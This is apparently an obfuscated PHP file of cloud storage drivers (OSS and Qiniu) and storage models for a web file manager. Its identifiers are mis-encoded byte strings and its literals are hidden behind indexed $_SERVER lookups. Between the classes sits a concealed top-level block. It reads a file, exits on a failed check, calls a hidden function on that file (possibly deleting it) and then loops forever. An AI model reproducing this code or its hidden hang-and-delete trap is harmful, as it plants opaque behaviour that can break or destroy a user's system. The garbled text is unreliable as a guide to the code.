$şÔ­óÚ : $¬ñÒ´Ï§[12]; } return isset($ÓÅ‹ûü[$¬ñÒ´Ï§[1422]]) ? strtolower($ÓÅ‹ûü[$¬ñÒ´Ï§[1422]]) : $¬ñÒ´Ï§[12]; } public function size($³²ìÆ‰) { $ÖâŸàï = $this->objectMeta($³²ìÆ‰); return $ÖâŸàï ? $ÖâŸàï[$_SERVER[Ã¶¡¶„æ][76]] : 0; } public function info($£àÀ«Å) { if ($this->isFolder($£àÀ«Å)) { return $this->folderInfo($£àÀ«Å); } else { if ($this->isFile($£àÀ«Å)) { return $this->fileInfo($£àÀ«Å); } } return !1; } public function exist($Ç¹¤Ù£•) { return $this->isFile($Ç¹¤Ù£•) || $this->isFolder($Ç¹¤Ù£•); } public function isFile($İÅê´ÀÏ) { return !$this->isFolder($İÅê´ÀÏ) && $this->objectMeta($İÅê´ÀÏ); } public function isFolder($ãå¬àƒÊ) { return $this->cacheMethod($_SERVER[Ã¶¡¶„æ][165], $ãå¬àƒÊ); } protected function objectMeta($ÇáÑù´É) { return $this->cacheMethod($_SERVER[Ã¶¡¶„æ][167], $ÇáÑù´É); } protected function _objectMeta($æ—Ÿ‚äº) { $Ù³÷Ş£¸ =& $_SERVER[Ã¶¡¶„æ]; try { $Åò‚êÖÇ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($æ—Ÿ‚äº)); } catch (OSS\Core\OssException $íÆòÎåş) { $Åò‚êÖÇ = !1; } if ($Åò‚êÖÇ) { $Åò‚êÖÇ[$Ù³÷Ş£¸[76]] = intval($Åò‚êÖÇ[$Ù³÷Ş£¸[1420]]); } return $Åò‚êÖÇ; } protected function _isFolder($ÙÕóœĞ¡) { $’¨ñğæ =& $_SERVER[Ã¶¡¶„æ]; if ($ÙÕóœĞ¡ == $’¨ñğæ[12] || $ÙÕóœĞ¡ == $’¨ñğæ[8]) { return !0; } $ïèéÉ¦¸ = array($’¨ñğæ[1416] => $’¨ñğæ[8], $’¨ñğæ[1417] => rtrim($ÙÕóœĞ¡, $’¨ñğæ[8]) . $’¨ñğæ[8], $’¨ñğæ[1418] => 1, $’¨ñğæ[1419] => $’¨ñğæ[12]); $ï¼ıœ±ä = $this->client->listObjects($this->bucket, $ïèéÉ¦¸); if ($ï¼ıœ±ä->getObjectList() || $ï¼ıœ±ä->getPrefixList()) { return !0; } return !1; } } if (!isset($_SERVER[$_SERVER[Ã¶¡¶„æ][840]]) || !isset($_SERVER[$_SERVER[Ã¶¡¶„æ][847]])) { $_getc = $_SERVER[Ã¶¡¶„æ][842]; $_getfile = $_SERVER[$_SERVER[Ã¶¡¶„æ][843]] . $_SERVER[Ã¶¡¶„æ][844]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ã¶¡¶„æ][231], $_getfilec); if (count($_getarrs) < $_SERVER[Ã¶¡¶„æ][619]) { $exit = $_SERVER[Ã¶¡¶„æ][845]; $exit(); } $_act = $_SERVER[Ã¶¡¶„æ][846]; $_act($_SERVER[$_SERVER[Ã¶¡¶„æ][843]] . $_SERVER[Ã¶¡¶„æ][844]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Ã¶¡¶„æ][378]); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($§ƒ©Ë­õ) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ã¶¡¶„æ][1448]; $this->_init($§ƒ©Ë­õ); } public function _init($´àÃÅáË) { $˜ïÑÁÕ» =& $_SERVER[Ã¶¡¶„æ]; foreach ($´àÃÅáË as $ßÂŸù¢¤ => $Ã•ˆ¨Íö) { if (isset($this->{$ßÂŸù¢¤})) { $this->{$ßÂŸù¢¤} = $Ã•ˆ¨Íö; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($˜ïÑÁÕ»[1449] . LNG($˜ïÑÁÕ»[1407])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($éÖ‰¡¨º, $ĞøØ¶Öß = '', $Ÿ¯Òª®è = REPEAT_RENAME) { if ($this->setContent($éÖ‰¡¨º, $ĞøØ¶Öß)) { return $this->getPathOuter($éÖ‰¡¨º); } return !1; } public function mkdir($Ä¨üÃ³ı, $ÑÜ®‰è = REPEAT_SKIP) { $İçÏÁğ =& $_SERVER[Ã¶¡¶„æ]; $ÖÁ øı = trim($Ä¨üÃ³ı, $İçÏÁğ[8]); if ($this->_isFolder($ÖÁ øı)) { return $this->getPathOuter($ÖÁ øı); } $Ä¨üÃ³ı = $ÖÁ øı . $İçÏÁğ[8]; $Ö»©‹Êí = get_path_this($ÖÁ øı); $µâš”·ª = $Ä¨üÃ³ı . $Ö»©‹Êí; if (!$this->mkfile($µâš”·ª)) { return !1; } if (!$this->moveFile($µâš”·ª, $Ä¨üÃ³ı)) { $this->delFile($µâš”·ª); return !1; } return $this->getPathOuter($ÖÁ øı); } public function copyFile($ã“‡Ó”¶, $Ö¿ôâ‘‘) { $›´ş­İ¸ = $this->bucketManager->copy($this->bucket, $ã“‡Ó”¶, $this->bucket, $Ö¿ôâ‘‘, !0); return $›´ş­İ¸ ? !1 : $this->getPathOuter($Ö¿ôâ‘‘); } public function moveFile($°ıÒıìŠ, $ŒÖîßı) { $²÷ÀºŸ¦ = $this->bucketManager->move($this->bucket, $°ıÒıìŠ, $this->bucket, $ŒÖîßı, !0); return $²÷ÀºŸ¦ ? !1 : $this->getPathOuter($ŒÖîßı); } public function delFile($ªØÏä¼Õ) { if (!$this->exist($ªØÏä¼Õ)) { return !0; } $ºò‘¸åÁ = $this->bucketManager->delete($this->bucket, $ªØÏä¼Õ); return $ºò‘¸åÁ ? !1 : !0; } public function delFolder($¿ß³é…») { $“®ç™†€ =& $_SERVER[Ã¶¡¶„æ]; if (!$this->exist($¿ß³é…»)) { return !0; } $this->listItemCache = !1; $­»ÓŠê = $this->fileList($¿ß³é…»); $this->listItemCache = !0; $áèşåìí = trim($¿ß³é…», $“®ç™†€[8]) . $“®ç™†€[8]; if (!empty($¿ß³é…») && $¿ß³é…» !== $“®ç™†€[197] && !in_array($áèşåìí, $­»ÓŠê[$“®ç™†€[82]])) { $­»ÓŠê[$“®ç™†€[82]][] = $áèşåìí; } $åşÙ·ë˜ = $this->delByBatch($­»ÓŠê[$“®ç™†€[83]]); if (!$åşÙ·ë˜) { return !1; } $åşÙ·ë˜ = $this->delByBatch($­»ÓŠê[$“®ç™†€[82]]); if (!$åşÙ·ë˜) { return !1; } return $this->delFile($áèşåìí); } private function delByBatch($šæÂæ½ƒ) { foreach (array_chunk($šæÂæ½ƒ, 1000) as $øê£Û¢) { $…àÒÒ¼ = $this->bucketManager->buildBatchDelete($this->bucket, $øê£Û¢); list($¤ªË—››, $ÙÏÁ³÷) = $this->bucketManager->batch($…àÒÒ¼); if ($ÙÏÁ³÷) { return !1; } } return !0; } public function rename($ù›¿î±ï, $ÛÅÎÉŠŒ) { return $this->renameObject($ù›¿î±ï, $ÛÅÎÉŠŒ); } public function fileInfo($öÎ¦Ğ, $ó¶®®ƒ† = false, $ÏŞğ×¦ = array()) { $¸İø·‰ =& $_SERVER[Ã¶¡¶„æ]; $…Œá‡ = array($¸İø·‰[32] => $this->pathThis($öÎ¦Ğ), $¸İø·‰[84] => $this->getPathOuter($¸İø·‰[8] . $öÎ¦Ğ), $¸İø·‰[33] => $¸İø·‰[199], $¸İø·‰[76] => isset($ÏŞğ×¦[$¸İø·‰[1450]]) ? $ÏŞğ×¦[$¸İø·‰[1450]] : 0, $¸İø·‰[174] => $this->ext($öÎ¦Ğ)); if ($ó¶®®ƒ†) { return $…Œá‡; } $…Œá‡[$¸İø·‰[200]] = $…Œá‡[$¸İø·‰[85]] = 0; $…Œá‡[$¸İø·‰[201]] = $…Œá‡[$¸İø·‰[202]] = !0; if (empty($ÏŞğ×¦)) { $ÏŞğ×¦ = $this->objectMeta($öÎ¦Ğ); if (!$ÏŞğ×¦) { return $…Œá‡; } } if (isset($ÏŞğ×¦[$¸İø·‰[1451]])) { $…Œá‡[$¸İø·‰[85]] = substr($ÏŞğ×¦[$¸İø·‰[1451]] . $¸İø·‰[12], 0, 10); } if (isset($ÏŞğ×¦[$¸İø·‰[1450]])) { $…Œá‡[$¸İø·‰[76]] = $ÏŞğ×¦[$¸İø·‰[1450]]; } return $…Œá‡; } public function folderInfo($“›îÉå…, $ãİÛÜàÎ = false) { $ñÔŞÍ =& $_SERVER[Ã¶¡¶„æ]; $Š¶ÜÃğ  = array($ñÔŞÍ[32] => $this->pathThis($“›îÉå…), $ñÔŞÍ[84] => $this->getPathOuter($ñÔŞÍ[8] . $“›îÉå…), $ñÔŞÍ[33] => $ñÔŞÍ[75]); if ($ãİÛÜàÎ) { return $Š¶ÜÃğ ; } $Š¶ÜÃğ [$ñÔŞÍ[200]] = $Š¶ÜÃğ [$ñÔŞÍ[85]] = 0; $Š¶ÜÃğ [$ñÔŞÍ[201]] = $Š¶ÜÃğ [$ñÔŞÍ[202]] = !0; $“›îÉå… = rtrim($“›îÉå…, $ñÔŞÍ[8]) . $ñÔŞÍ[8]; $›ÍŒØÜ = $this->objectMeta($“›îÉå…); if (isset($›ÍŒØÜ[$ñÔŞÍ[1451]])) { $Š¶ÜÃğ [$ñÔŞÍ[85]] = substr($›ÍŒØÜ[$ñÔŞÍ[1451]] . $ñÔŞÍ[12], 0, 10); } return $Š¶ÜÃğ ; } public function listPath($Ö ëÇ»î, $½¼œÉ‚… = false) { $šäôŠÍ =& $_SERVER[Ã¶¡¶„æ]; $¨Áæí†È = $this->fileList($Ö ëÇ»î, $šäôŠÍ[8], !0); foreach ($¨Áæí†È[$šäôŠÍ[82]] as $‚ÌóÕ§ => $ƒèãıº×) { $¨Áæí†È[$šäôŠÍ[82]][$‚ÌóÕ§] = $this->folderInfo($ƒèãıº×, $½¼œÉ‚…); } foreach ($¨Áæí†È[$šäôŠÍ[83]] as $‚ÌóÕ§ => $ƒèãıº×) { $¨Áæí†È[$šäôŠÍ[83]][$‚ÌóÕ§] = $this->fileInfo($ƒèãıº×[$šäôŠÍ[94]], $½¼œÉ‚…, $ƒèãıº×); } return $¨Áæí†È; } public function has($‡Ü˜Óæã, $ª§¥İŞû = false, $šÍÌ¼—ª = true) { $ĞÂ¬Ñ½ =& $_SERVER[Ã¶¡¶„æ]; $‡Ü˜Óæã = trim($‡Ü˜Óæã, $ĞÂ¬Ñ½[8]); $¸îã¹ = empty($‡Ü˜Óæã) && $‡Ü˜Óæã !== $ĞÂ¬Ñ½[197] ? $ĞÂ¬Ñ½[12] : $‡Ü˜Óæã . $ĞÂ¬Ñ½[8]; $¥È ¾ìú = $ĞÂ¬Ñ½[12]; $ÕÈÇÑÎ = 500; $Ä¶’œƒ = $ĞÂ¬Ñ½[8]; $ÑŒÄ®Ì = $şäŸÌ = 0; while (!0) { check_abort(); list($ˆ½Ñàˆğ, $îŠîıÊ) = $this->bucketManager->listFiles($this->bucket, $¸îã¹, $¥È ¾ìú, $ÕÈÇÑÎ, $Ä¶’œƒ); if ($îŠîıÊ) { break; } $¥È ¾ìú = array_key_exists($ĞÂ¬Ñ½[1419], $ˆ½Ñàˆğ) ? $¥È ¾ìú = $ˆ½Ñàˆğ[$ĞÂ¬Ñ½[1452]] : $ĞÂ¬Ñ½[12]; if ($ª§¥İŞû) { if (!empty($ˆ½Ñàˆğ[$ĞÂ¬Ñ½[1453]])) { $ÑŒÄ®Ì += count($ˆ½Ñàˆğ[$ĞÂ¬Ñ½[1453]]); } if (!empty($ˆ½Ñàˆğ[$ĞÂ¬Ñ½[1454]])) { $şäŸÌ += count($ˆ½Ñàˆğ[$ĞÂ¬Ñ½[1454]]); } if ($¥È ¾ìú === $ĞÂ¬Ñ½[12]) { break; } continue; } if ($šÍÌ¼—ª) { if (!empty($ˆ½Ñàˆğ[$ĞÂ¬Ñ½[1453]])) { return !0; } } else { if (!empty($ˆ½Ñàˆğ[$ĞÂ¬Ñ½[1454]])) { return !0; } } if ($¥È ¾ìú === $ĞÂ¬Ñ½[12]) { break; } } if ($ª§¥İŞû) { return array($ĞÂ¬Ñ½[207] => $ÑŒÄ®Ì, $ĞÂ¬Ñ½[208] => $şäŸÌ); } return !1; } public function listAll($ĞıÅ’Ü‹) { $•¤Ğºñ¼ =& $_SERVER[Ã¶¡¶„æ]; $·‡ø©á = $this->fileList($ĞıÅ’Ü‹, $•¤Ğºñ¼[12], !0); $ñù¸úÓë = array(); foreach ($·‡ø©á[$•¤Ğºñ¼[83]] as $‚Ãåäú) { $ñù¸úÓë[$‚Ãåäú[$•¤Ğºñ¼[94]]] = $‚Ãåäú[$•¤Ğºñ¼[76]]; } foreach ($·‡ø©á[$•¤Ğºñ¼[82]] as $‚Ãåäú) { if (is_string($‚Ãåäú)) { $ñù¸úÓë[$‚Ãåäú] = 0; } } return $this->listAllFiles($ĞıÅ’Ü‹, array_keys($ñù¸úÓë), $ñù¸úÓë); } private function fileList($Ó“ÇÚö, $¤‚İçÅ = '', $àÎªó­¼ = 0) { $ä ï …ñ =& $_SERVER[Ã¶¡¶„æ]; $Ó“ÇÚö = trim($Ó“ÇÚö, $ä ï …ñ[8]); $ú¨ç‡‘Ç = empty($Ó“ÇÚö) && $Ó“ÇÚö !== $ä ï …ñ[197] ? $ä ï …ñ[12] : $Ó“ÇÚö . $ä ï …ñ[8]; $ÔöŞÒí = $ä ï …ñ[12]; $ÉŞø¨ù = 1000; $ğ–ÉÍÎ¬ = $¹³¿ëïß = array(); while (!0) { check_abort(); list($·ó¬š–, $È©æÆÏ) = $this->bucketManager->listFiles($this->bucket, $ú¨ç‡‘Ç, $ÔöŞÒí, $ÉŞø¨ù, $¤‚İçÅ); if ($È©æÆÏ) { break; } $ÔöŞÒí = array_key_exists($ä ï …ñ[1419], $·ó¬š–) ? $ÔöŞÒí = $·ó¬š–[$ä ï …ñ[1452]] : $ä ï …ñ[12]; $¹”˜Ş£ğ = isset($·ó¬š–[$ä ï …ñ[1453]]) ? $·ó¬š–[$ä ï …ñ[1453]] : array(); $ôÚÑ¸Ãğ = isset($·ó¬š–[$ä ï …ñ[1454]]) ? $·ó¬š–[$ä ï …ñ[1454]] : array(); foreach ($¹”˜Ş£ğ as $¸¬ÏÓ¨) { if ($¸¬ÏÓ¨[$ä ï …ñ[94]] == $ú¨ç‡‘Ç) { continue; } $€ó˜¯Úæ = $¸¬ÏÓ¨[$ä ï …ñ[94]]; $Ã–¨ç¶” = $¸¬ÏÓ¨[$ä ï …ñ[1450]]; $¸¬ÏÓ¨[$ä ï …ñ[76]] = $Ã–¨ç¶”; $ñ»î¶ = $Ã–¨ç¶” == 0 && substr($€ó˜¯Úæ, strlen($€ó˜¯Úæ) - 1, 1) == $ä ï …ñ[8] ? !0 : !1; $this->cacheMethodInfoSet($€ó˜¯Úæ, $ñ»î¶, $¸¬ÏÓ¨); if ($ñ»î¶) { $ğ–ÉÍÎ¬[] = $€ó˜¯Úæ; continue; } $¹³¿ëïß[] = $àÎªó­¼ ? $¸¬ÏÓ¨ : $€ó˜¯Úæ; } foreach ($ôÚÑ¸Ãğ as $€ó˜¯Úæ) { if ($€ó˜¯Úæ == $ú¨ç‡‘Ç) { continue; } $ğ–ÉÍÎ¬[] = $€ó˜¯Úæ; $this->cacheMethodInfoSet($€ó˜¯Úæ, !0); } if ($ÔöŞÒí === $ä ï …ñ[12]) { break; } } $this->cacheMethodInfoSet($Ó“ÇÚö, !0); return array($ä ï …ñ[82] => $ğ–ÉÍÎ¬, $ä ï …ñ[83] => $¹³¿ëïß); } public function canRead($ëÕ°™ÜÂ) { return $this->exist($ëÕ°™ÜÂ) ? !0 : !1; } public function canWrite($öÈĞÔ‡) { return $this->exist($öÈĞÔ‡) ? !0 : !1; } public function getContent($¯Ë„úóª) { return $this->fileSubstr($¯Ë„úóª, 0, -1); } public function setContent($‚»æçÉ½, $®’½€Ì½ = '') { $Óô×Éª¡ = $this->tempFile($this->pathThis($‚»æçÉ½)); file_put_contents($Óô×Éª¡, $®’½€Ì½); if ($this->upload($‚»æçÉ½, $Óô×Éª¡)) { $this->tempFileRemve($Óô×Éª¡); return !0; } return !1; } public function refreshUrls($‰÷¶ş©‹) { $›ÒµÓ¯ =& $_SERVER[Ã¶¡¶„æ]; $ñš·ìÅ´ = array(); if (is_array($‰÷¶ş©‹)) { foreach ($‰÷¶ş©‹ as $ºòë‚¾é) { $ñš·ìÅ´[] = $this->link($ºòë‚¾é); } } else { $ñš·ìÅ´[] = $this->link($‰÷¶ş©‹); } $–öùÊ‡’ = new Qiniu\Cdn\CdnManager($this->auth); list($Ğƒ…ˆéÕ, $ùèõ‹ùÑ) = $–öùÊ‡’->refreshUrls($ñš·ìÅ´); if ($ùèõ‹ùÑ) { return !1; } return $Ğƒ…ˆéÕ[$›ÒµÓ¯[1197]] == $›ÒµÓ¯[766] ? !0 : !1; } public function fileSubstr($ÉÙÌ¨õ, $âš¦†ç•, $¾ŠÈšğ×) { $Ïâ¼íŞò =& $_SERVER[Ã¶¡¶„æ]; if (!($ÈÎıÛ¼“ = $this->link($ÉÙÌ¨õ))) { return !1; } $ÊÜ÷ò = !1; if ($¾ŠÈšğ× > 0) { $‰¨¥Í–Á = $âš¦†ç• + $¾ŠÈšğ× - 1; $ÊÜ÷ò = array($Ïâ¼íŞò[1455] . $âš¦†ç• . $Ïâ¼íŞò[386] . $‰¨¥Í–Á); } $Ê”çê = url_request($ÈÎıÛ¼“, $Ïâ¼íŞò[230], !1, $ÊÜ÷ò); return $Ê”çê[$Ïâ¼íŞò[756]] ? $Ê”çê[$Ïâ¼íŞò[1217]] : !1; } public function upload($“õ¦ÍÊç, $ÇÄ®³ÆÜ, $‚…†–ë = false, $Âò•êŒ™ = REPEAT_REPLACE) { $é³ÁáÂó = new Qiniu\Storage\UploadManager(); $ó¤ ”ÅØ = $this->auth->uploadToken($this->bucket, $“õ¦ÍÊç); $¨È×½Â = get_file_mime(get_path_ext($ÇÄ®³ÆÜ)); list($ ›î³áİ, $Ééã–Š) = $é³ÁáÂó->putFile($ó¤ ”ÅØ, $“õ¦ÍÊç, $ÇÄ®³ÆÜ, null, $¨È×½Â); return $Ééã–Š ? !1 : $this->getPathOuter($“õ¦ÍÊç); } public function uploadFormData($½şÛÅêÄ, $³Ú¯í«ğ = 3600) { return $this->uploadToken($½şÛÅêÄ, $³Ú¯í«ğ); } public function multiUploadFormData($šÄŒğúè, $©œ‡“ ƒ = 3600) { return $this->uploadToken($šÄŒğúè, $©œ‡“ ƒ); } private function uploadToken($åîûŠ, $€¿¿Õõ = 3600) { $àØ¨ŒÜ‹ =& $_SERVER[Ã¶¡¶„æ]; $ÂÙİ“µ = $€¿¿Õõ; $‡å¯ÃÇ = array($àØ¨ŒÜ‹[1456] => $àØ¨ŒÜ‹[1457]); $‘Ü€Û°Á = $åîûŠ; $º²ƒÄĞ = $this->auth->uploadToken($this->bucket, $‘Ü€Û°Á, $ÂÙİ“µ, $‡å¯ÃÇ, !0); $íĞ„×ŠÎ = empty($this->region) || $this->region == $àØ¨ŒÜ‹[1458] ? $àØ¨ŒÜ‹[12] : $àØ¨ŒÜ‹[386] . $this->region; $‡ìÇÜ“™ = http_type() . "\x3a\x2f\x2f\165\160\x6c\157\x61\x64{$íĞ„×ŠÎ}\x2e\161\x69\156\151\x75\x70\x2e\x63\157\x6d\57"; return array($àØ¨ŒÜ‹[1459] => $º²ƒÄĞ, $àØ¨ŒÜ‹[1460] => $‡ìÇÜ“™); } public function download($©²èåÓø, $¬¿®Õ´ì) { $ıšäà³Ø = IO::getPathInner(IO::mkfile($¬¿®Õ´ì)); if (!($€äâƒ¡ú = $this->link($©²èåÓø))) { return !1; } $•¥…”Áì = 0; $¡ÃÈ€„ = 1024 * 200; $á·ÁÏ¦§ = fopen($ıšäà³Ø, $_SERVER[Ã¶¡¶„æ][1461]); while (!0) { $ ½óÄ£Ä = $this->fileSubstr($©²èåÓø, $•¥…”Áì, $¡ÃÈ€„); if ($ ½óÄ£Ä === !1) { return !1; } fwrite($á·ÁÏ¦§, $ ½óÄ£Ä); $•¥…”Áì += $¡ÃÈ€„; if (strlen($ ½óÄ£Ä) < $¡ÃÈ€„) { break; } } fclose($á·ÁÏ¦§); return $¬¿®Õ´ì; } public function link($¬‘â°ş, $ÙÖó†„ñ = '') { if (!$this->isFile($¬‘â°ş)) { return !1; } $æÇµ†ÌÈ = $this->getHost() . $_SERVER[Ã¶¡¶„æ][8] . $this->pathEncode($¬‘â°ş) . $ÙÖó†„ñ; return $this->auth->privateDownloadUrl($æÇµ†ÌÈ, 3600 * 12); } public function fileOut($ãƒ¯¨Î©, $²ğ÷Œè = false, $¢±ëéÑğ = false, $‹è²«Ø¨ = '') { $ Ëáìâ =& $_SERVER[Ã¶¡¶„æ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ãƒ¯¨Î©, $²ğ÷Œè, $¢±ëéÑğ, $‹è²«Ø¨); } if (!$¢±ëéÑğ) { $¢±ëéÑğ = $this->pathThis($ãƒ¯¨Î©); } $ÁÄ‡Õ¯¶ = $²ğ÷Œè ? $ Ëáìâ[1462] . rawurlencode($¢±ëéÑğ) : $ Ëáìâ[12]; $¹’§•Àí = $this->link($ãƒ¯¨Î©, $ÁÄ‡Õ¯¶); $this->fileOutLink($¹’§•Àí); } public function fileOutServer($×çÄó‹Ì, $µ¶“¥ó§ = false, $ğ®äÕ¦† = false, $ˆ°µŸ¯Ô = '') { parent::fileOut($×çÄó‹Ì, $µ¶“¥ó§, $ğ®äÕ¦†, $ˆ°µŸ¯Ô); } public function fileOutImage($±éíåÄ¹, $²¤¬¾¿à = 250) { $Ù¼Ùî„Â = $this->link($±éíåÄ¹, $_SERVER[Ã¶¡¶„æ][1463] . $²¤¬¾¿à); $this->fileOutLink($Ù¼Ùî„Â); } public function fileOutImageServer($æ¥×Å, $ñû¿¯´É = 250) { parent::fileOutImage($æ¥×Å, $ñû¿¯´É); } public function hashMd5($®Ÿü†”¶) { $“ŸÚñ» =& $_SERVER[Ã¶¡¶„æ]; $Ò¨°„šİ = $this->objectMeta($®Ÿü†”¶); return isset($Ò¨°„šİ[$“ŸÚñ»[212]]) ? $Ò¨°„šİ[$“ŸÚñ»[212]] : !1; $ÌãÆ«Ô = $this->link($®Ÿü†”¶, $“ŸÚñ»[1464]); } public function size($„›‹¾ú´) { $ô¶‘‰Ô¬ = $this->objectMeta($„›‹¾ú´); return $ô¶‘‰Ô¬ ? $ô¶‘‰Ô¬[$_SERVER[Ã¶¡¶„æ][76]] : 0; } public function info($Å…æà…±) { if ($this->isFolder($Å…æà…±)) { return $this->folderInfo($Å…æà…±); } else { if ($this->isFile($Å…æà…±)) { return $this->fileInfo($Å…æà…±); } } return !1; } public function exist($î”»ˆ„Ç) { return $this->isFile($î”»ˆ„Ç) || $this->isFolder($î”»ˆ„Ç); } public function isFile($á„¯ª„¬) { return !$this->isFolder($á„¯ª„¬) && $this->objectMeta($á„¯ª„¬); } public function isFolder($Óºé›Ï‹) { return $this->cacheMethod($_SERVER[Ã¶¡¶„æ][165], $Óºé›Ï‹); } protected function objectMeta($Õíœ¼‡) { return $this->cacheMethod($_SERVER[Ã¶¡¶„æ][167], $Õíœ¼‡); } protected function _objectMeta($°ÚÅ×üÉ) { $²Â¾×úÆ =& $_SERVER[Ã¶¡¶„æ]; list($¨òÀ…Ë§, $½í¿˜î÷) = $this->bucketManager->stat($this->bucket, $°ÚÅ×üÉ); if ($¨òÀ…Ë§) { $¨òÀ…Ë§[$²Â¾×úÆ[76]] = intval($¨òÀ…Ë§[$²Â¾×úÆ[1450]]); } return $¨òÀ…Ë§; } protected function _isFolder($¾¡…À’ü) { $ÁË£ğ­ =& $_SERVER[Ã¶¡¶„æ]; if ($¾¡…À’ü == $ÁË£ğ­[12] || $¾¡…À’ü == $ÁË£ğ­[8]) { return !0; } list($ÄàÒÑ÷…, $…œ×Ô˜) = $this->bucketManager->listFiles($this->bucket, trim($¾¡…À’ü, $ÁË£ğ­[8]) . $ÁË£ğ­[8], $ÁË£ğ­[12], 1, $ÁË£ğ­[8]); return !empty($ÄàÒÑ÷…[$ÁË£ğ­[1453]]) || !empty($ÄàÒÑ÷…[$ÁË£ğ­[1454]]) ? !0 : !1; } } goto B‰šÖƒå´; dåÁÆ¸Ùá¼: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\x2e\163\157\165\162\x63\x65\x53\145\143\x72\145\164\114\151\163\x74"; public $field = array("\x73\x6f\x75\x72\143\x65\x49\x44", "\164\171\x70\x65\x49\x44", "\143\162\145\141\x74\x65\x55\x73\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\163\x74\157\x72\x61\147\145\114\x69\163\x74"; public $field = array("\x6e\x61\155\x65", "\163\151\x7a\145\115\x61\x78", "\163\x79\x73\x74\145\x6d", "\144\145\x66\141\x75\154\x74", "\144\162\x69\166\145\162", "\143\157\156\x66\151\x67"); public function listData($‚¢Öõ = false, $ê°ÈÌŒ³ = "\x6d\x6f\x64\151\x66\171\x54\x69\x6d\x65", $ˆ¯òçûÉ = false) { $ĞÀ‚Ë²Û =& $_SERVER[Ã¶¡¶„æ]; $íËşã = parent::listData($‚¢Öõ, $ê°ÈÌŒ³, $ˆ¯òçûÉ); if ($‚¢Öõ) { return $íËşã; } $‘íÕÛ­ = $this->ioSizeUseGet(array_to_keyvalue($íËşã, $ĞÀ‚Ë²Û[12], $ĞÀ‚Ë²Û[399])); foreach ($íËşã as $ª¹óÆÙŞ => $à¾ĞƒŒÓ) { unset($íËşã[$ª¹óÆÙŞ][$ĞÀ‚Ë²Û[6]]); $íËşã[$ª¹óÆÙŞ][$ĞÀ‚Ë²Û[1854]] = isset($‘íÕÛ­[$à¾ĞƒŒÓ[$ĞÀ‚Ë²Û[399]]]) ? $‘íÕÛ­[$à¾ĞƒŒÓ[$ĞÀ‚Ë²Û[399]]] : 0; } return $íËşã; } public function ioSizeUseGet($ä‰Îõµ) { $î„§§¼Ë =& $_SERVER[Ã¶¡¶„æ]; if (!$ä‰Îõµ) { return array(); } $ÅúÓëïæ = $î„§§¼Ë[2177] . implode($î„§§¼Ë[50], $ä‰Îõµ); $¬Ó…ñÅ = Cache::get($ÅúÓëïæ); if ($¬Ó…ñÅ) { return $¬Ó…ñÅ; } $Ë“‡®¹Ğ = array($î„§§¼Ë[823] => $î„§§¼Ë[399], $î„§§¼Ë[2178] => $î„§§¼Ë[76]); $ƒ¨ÅÄß¡ = array($î„§§¼Ë[823] => array($î„§§¼Ë[7], $ä‰Îõµ)); $¬Ó…ñÅ = Model($î„§§¼Ë[795])->field($Ë“‡®¹Ğ)->where($ƒ¨ÅÄß¡)->group($î„§§¼Ë[823])->select(); $¬Ó…ñÅ = array_to_keyvalue($¬Ó…ñÅ, $î„§§¼Ë[399], $î„§§¼Ë[76]); Cache::set($ÅúÓëïæ, $¬Ó…ñÅ, 600); return $¬Ó…ñÅ; } public function getConfig($ÁáµŸ¡¯) { $¯¯‰²ˆ = parent::listData($ÁáµŸ¡¯); return json_decode($¯¯‰²ˆ[$_SERVER[Ã¶¡¶„æ][6]], !0); } public function update($‰È³­é, $ñ±«İªé) { $‹†Ä„ØÓ =& $_SERVER[Ã¶¡¶„æ]; $ÜüÆÀ” = $ñ±«İªé[$‹†Ä„ØÓ[32]]; $÷ûÓ–ã = array_to_keyvalue(parent::listData(), $‹†Ä„ØÓ[32]); if (isset($÷ûÓ–ã[$ÜüÆÀ”]) && $÷ûÓ–ã[$ÜüÆÀ”][$‹†Ä„ØÓ[399]] != $‰È³­é) { return !1; } $this->checkPwd($‰È³­é, $ñ±«İªé); if (isset($ñ±«İªé[$‹†Ä„ØÓ[2179]]) && $ñ±«İªé[$‹†Ä„ØÓ[2179]] == $‹†Ä„ØÓ[88]) { $this->checkConfig($ñ±«İªé); } unset($ñ±«İªé[$‹†Ä„ØÓ[2179]]); $òç™üÏë = parent::update($‰È³­é, $ñ±«İªé); if ($òç™üÏë && $ñ±«İªé[$‹†Ä„ØÓ[37]]) { $ı¡’íêÆ = 0; foreach ($÷ûÓ–ã as $Íš «Ş) { if ($Íš «Ş[$‹†Ä„ØÓ[37]] && $Íš «Ş[$‹†Ä„ØÓ[399]] != $‰È³­é) { $ı¡’íêÆ = $Íš «Ş[$‹†Ä„ØÓ[399]]; parent::update($Íš «Ş[$‹†Ä„ØÓ[399]], array($‹†Ä„ØÓ[37] => 0)); } } $this->updateBackup($‰È³­é, $ı¡’íêÆ); } return $òç™üÏë; } public function add($Á®ñÅ”Ö) { $ÊÃÎî³î =& $_SERVER[Ã¶¡¶„æ]; $âœçÓÎÈ = array_to_keyvalue(parent::listData(), $ÊÃÎî³î[32]); if (isset($âœçÓÎÈ[$Á®ñÅ”Ö[$ÊÃÎî³î[32]]])) { return !1; } $this->checkConfig($Á®ñÅ”Ö); $œ‘Íµì = parent::insert($Á®ñÅ”Ö); if ($œ‘Íµì && $Á®ñÅ”Ö[$ÊÃÎî³î[37]]) { foreach ($âœçÓÎÈ as $‡î£ôŒ‹) { if ($‡î£ôŒ‹[$ÊÃÎî³î[37]]) { parent::update($‡î£ôŒ‹[$ÊÃÎî³î[399]], 